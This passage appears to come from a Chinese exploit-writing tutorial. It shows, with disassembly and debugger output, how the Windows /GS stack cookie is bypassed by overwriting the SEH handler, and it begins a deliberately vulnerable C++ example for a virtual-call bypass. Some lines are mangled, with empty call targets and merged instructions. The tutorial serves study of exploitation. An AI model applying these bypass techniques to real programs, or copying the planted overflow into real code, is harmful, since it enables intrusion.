004010C5 . 8A85 D7FDFFFF MOV AL,BYTE PTR SS:[EBP-229]
004010CB . 8802 MOV BYTE PTR DS:[EDX],AL
004010CD . 8B8D E0FDFFFF MOV ECX,DWORD PTR SS:[EBP-220]
004010D3 . 83C1 01 ADD ECX,1
004010D6 . 898D E0FDFFFF MOV DWORD PTR SS:[EBP-220],ECX
004010DC . 8B95 DCFDFFFF MOV EDX,DWORD PTR SS:[EBP-224]
004010E2 . 83C2 01 ADD EDX,1
004010E5 . 8995 DCFDFFFF MOV DWORD PTR SS:[EBP-224],EDX
004010EB . 80BD D7FDFFFF >CMP BYTE PTR SS:[EBP-229],0
004010F2 .^75 BD JNZ SHORT basicbof.004010B1;jmp to 0x00401090,get next char
004010F4 . 8D85 F8FDFFFF LEA EAX,DWORD PTR SS:[EBP-208]
004010FA . 50 PUSH EAX ; /
004010FB . 68 FC204000 PUSH basicbof.004020FC ; |format = "Input received : %s
"
00401100 . FF15 A8204000 CALL DWORD PTR DS:[] \printf
00401106 . 83C4 08 ADD ESP,8
00401109 . EB 30 JMP SHORT basicbof.0040113B
0040110B . 68 14214000 PUSH basicbof.00402114 ; /format = "No valid input received
!
"
00401110 . FF15 A8204000 CALL DWORD PTR DS:[] ; \printf
00401116 . 83C4 04 ADD ESP,4
00401119 . 8B8D F4FDFFFF MOV ECX,DWORD PTR SS:[EBP-20C]
0040111F . 51 PUSH ECX ; /
00401120 . 68 30214000 PUSH basicbof.00402130 ; |format = "Exception : %s
"
00401125 . FF15 A8204000 CALL DWORD PTR DS:[] ; \printf
0040112B . 83C4 08 ADD ESP,8
0040112E . C745 FC FFFFFF>MOV DWORD PTR SS:[EBP-4],-1
00401135 . B8 42114000 MOV EAX,basicbof.00401142
0040113A . C3 RETN
当函数GetInput()的开头被执行时，函数的参数被保存在地址0×003429f3中（edx）:
0:000> d edx
003429f3 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
00342a03 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
这个参数的地址被压栈（所以在地址0×0012fef4上存放着0×003429f3）。
堆栈指针（esp）指向0×0012fef0，ebp指向 0×0012ff7c，这两个地址形成了新的栈帧，esp现在指向
的内存存放的是0×00401179(用于返回主函数的返回地址)。
basicbof!main
00401160 55 push ebp
00401161 8bec mov ebp,esp
00401163 81ec80000000 sub esp,80h
00401169 8d4580 lea eax,[ebp-80h]
0040116c 50 push eax
0040116d 8b4d0c mov ecx,dword ptr [ebp+0Ch] ;pointer to argument
00401170 8b5104 mov edx,dword ptr [ecx+4] ;pointer to argument
00401173 52 push edx ; buffer argument
00401174 e887feffff call basicbof!GetInput (00401000) ; GetInput()
00401179 83c408 add esp,8 ;normally GetInput returns here
0040117c 33c0 xor eax,eax0040117e 8be5 mov esp,ebp
00401180 5d pop ebp
00401181 c3 ret
不管怎么样，我们先看下上边函数GetInput的汇编代码，在把参数的指针放到堆栈中后，函数开头首先
把ebp压栈，接下来，把esp放进ebp,这样ebp指向了栈帧的开头,从本质上来说新栈帧是从函数被调用
时的esp的位置开始的，esp现在指向0×0012feec(包含0c0012ff7c)。当有新数据压栈的时候，ebp保
持不变(ebp成了栈底)。
然后，异常处理器被安装，首先，把FFFFFFFF压栈（表示这是SEH链的末尾）。
00401003 . 6A FF PUSH -1
00401005 . 68 A01A4000 PUSH basicbof.00401AA0
然后，一个异常处理器和指向下一个异常处理器结构的指针被压栈:
0040100A . 64:A1 00000000 MOV EAX,DWORD PTR FS:[0]
00401010 . 50 PUSH EAX
00401011 . 64:8925 000000>MOV DWORD PTR FS:[0],ESP
堆栈看起来是这个样子:
^ stack grows up towards top of stack while address of ESP goes down
| 0012FECC 785438C5 MSVCR90.785438C5
| 0012FED0 0012FEE8
| 0012FED4 7855C40C MSVCR90.7855C40C
| 0012FED8 00152150
| 0012FEDC 0012FEF8  uf GetInput
basicbof!GetInput [basicbof\basicbof.cpp @ 6]:
6 00401000 55 push ebp
6 00401001 8bec mov ebp,esp
6 00401003 6aff push 0FFFFFFFFh
6 00401005 68d01a4000 push offset basicbof!_CxxFrameHandler3+0xc (00401ad0)
6 0040100a 64a100000000 mov eax,dword ptr fs:[00000000h]
6 00401010 50 push eax
6 00401011 51 push ecx
6 00401012 81ec24020000 sub esp,224h
6 00401018 a118304000 mov eax,dword ptr [basicbof!__security_cookie
(00403018)]
6 0040101d 33c5 xor eax,ebp
6 0040101f 8945ec mov dword ptr [ebp-14h],eax
6 00401022 53 push ebx
6 00401023 56 push esi
6 00401024 57 push edi
6 00401025 50 push eax
6 00401026 8d45f4 lea eax,[ebp-0Ch]
6 00401029 64a300000000 mov dword ptr fs:[00000000h],eax
6 0040102f 8965f0 mov dword ptr [ebp-10h],esp
9 00401032 c745fc00000000 mov dword ptr [ebp-4],0
10 00401039 8b4508 mov eax,dword ptr [ebp+8]
10 0040103c 8985e8fdffff mov dword ptr [ebp-218h],eax
10 00401042 8d8df0fdffff lea ecx,[ebp-210h]
10 00401048 898de4fdffff mov dword ptr [ebp-21Ch],ecx
10 0040104e 8b95e4fdffff mov edx,dword ptr [ebp-21Ch]
10 00401054 8995e0fdffff mov dword ptr [ebp-220h],edx
应用程序又挂掉了，从上边的汇编代码我们可以清晰的看到在函数GetInput的开头安全cookie就被放到
堆栈中了，所以经典的溢出方式（覆盖返回地址）不能工作了…但是我们可以覆盖异常处理器，（第一个
strcpy覆盖异常处理器，记住…在这个例子中，异常处理器仅仅被覆盖了两字节，因此在溢出的时候，
我们需要多增加两字节的数据。）:
0:000> !exchain
0012fed8: basicbof!_CxxFrameHandler3+c (00401ad0)
Invalid exception stack at 00004141
这意味着通过覆盖处理器来绕过/GS堆栈保护成为可能。
现在如果注释掉异常处理器(在函数GetInput中)，并给程序传输等数量字符，我们会得到:
0:000> g
(216c.2ce0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=0040337c
eip=004010b2 esp=0012fcc4 ebp=0012fee4 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
basicbof!GetInput+0xb2:
004010b2 8802 mov byte ptr [edx],al ds:0023:00130000=41
0:000> !exchain
0012ffb0: 41414141
Invalid exception stack at 41414141
因为给程序传递了同样长度的参数，但这次没有添加额外的异常处理器，所以不用增加字符就可以覆盖到
异常处理器了，看来我们在cookie被检查前已经成功触发了异常，如前所释，在函数GetInput中对函数
strcpy的第二次调用会触发这个异常。
为了证明这点，我们省略第二个 strcpy函数（因此只剩下一个 strcpy,并且没有安装异常处理器。），
那么我们会得到:
0:000> g
eax=000036c0 ebx=00000000 ecx=000036c0 edx=7c90e514 esi=00000001 edi=0040337c
eip=7c90e514 esp=0012f984 ebp=0012f994 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286
ntdll!KiFastSystemCallRet:
7c90e514 c3 ret
=> 堆栈中cookie保护又起作用了。
因此，我们可以得出结论: 如果存在漏洞的函数在cookie被检查前可以通过某种方式触发异常，那么就
有可能绕过堆栈中的cookie保护机制，例如：当函数继续使用已被破坏的缓冲区时。
注意: 要想成功攻击这个程序，你可能同时也要对付/safeseh保护机制…不管怎么样，堆栈中的cookie
保护机制是可以被绕过的。。。:-)
绕过栈中的cookie之二:虚函数调用
为了演示这种技术，我将使用Alex Soritov 和 Mark Dowd在Blackhat 2008演讲中使用的代码（为了让
它可以在VS2008 C++上成功编译，做了稍微的修改）。
// gsvtable.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
class Foo {
public:
void __declspec(noinline) gs3(char* src)
{
char buf[8];
strcpy(buf, src);
bar(); // virtual function call
}